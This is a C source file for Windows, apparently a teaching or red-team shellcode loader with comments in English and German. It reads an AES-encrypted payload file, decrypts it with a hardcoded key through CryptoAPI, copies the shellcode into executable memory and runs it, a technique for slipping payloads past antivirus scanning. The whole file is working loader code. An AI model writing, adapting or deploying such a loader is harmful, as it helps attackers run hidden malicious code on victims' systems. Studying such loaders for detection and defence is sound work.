
#include <Windows.h>
#include <Wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")





// paste the output of aesencrypt.py
char key[] = { 0x44, 0x9e, 0x8e, 0xb8, 0x6a, 0x2e, 0x55, 0x76, 0x60, 0x36, 0xe9, 0xd7, 0x80, 0x5e, 0x54, 0x96 };


// global var
unsigned char *payload;


// open the aes file and load it into the memory
unsigned char* load_file(const char *filename, long *file_size) {
    FILE *file;

    // Öffne die Datei im Binärmodus
    file = fopen(filename, "rb");
    if (file == NULL) {
        perror("Datei konnte nicht geöffnet werden");
        return NULL;
    }

    // Bewege den Datei-Offset zum Ende der Datei, um die Größe zu bestimmen
    fseek(file, 0, SEEK_END);
    *file_size = ftell(file);
    rewind(file); // Zurück zum Anfang der Datei

    // Allokiere Speicher für den Payload
    payload = (unsigned char*) malloc(*file_size * sizeof(unsigned char));
    if (payload == NULL) {
        perror("Speicher konnte nicht zugewiesen werden");
        fclose(file);
        return NULL;
    }

    // Lese die Datei in das Array
    size_t read_size = fread(payload, sizeof(unsigned char), *file_size, file);
    if (read_size != *file_size) {
        perror("Fehler beim Lesen der Datei");
        free(payload);
        fclose(file);
        return NULL;
    }

    // Datei schließen
    fclose(file);

    return payload;
}






int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	DWORD decrypted_len = (DWORD) payload_len;
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, &decrypted_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}



int main() {
	
	
	void *exec_mem;
	unsigned int payload_len;
	long file_size;

	// Load the encrypted AES file into payload
	payload = load_file("shellcode.aes", &file_size);
	if (payload == NULL) {
		return 1; // Fehler beim Laden der Datei
	}

	payload_len = file_size;

	// Allocate memory for the payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (exec_mem == NULL) {
		perror("VirtualAlloc fehlgeschlagen");
		return 1; // Memory allocation failed
	}

	// Decrypt the shellcode
	if (AESDecrypt((char *)payload, payload_len, (char *)key, sizeof(key)) != 0) {
		perror("Fehler bei der Entschlüsselung");
		return 1; // Decryption failed
	}

	printf("shellcode should ne decrypted now - press any key...:");
	// Pause for debugging purposes (remove in production)
	getchar();


	
	// Copy decrypted payload to the allocated buffer
	RtlMoveMemory(exec_mem, payload, payload_len);


	
	printf("execute the shellcode - press any key...:");
	getchar();
	((void(*)())exec_mem)();

	return 0; // End of program

}
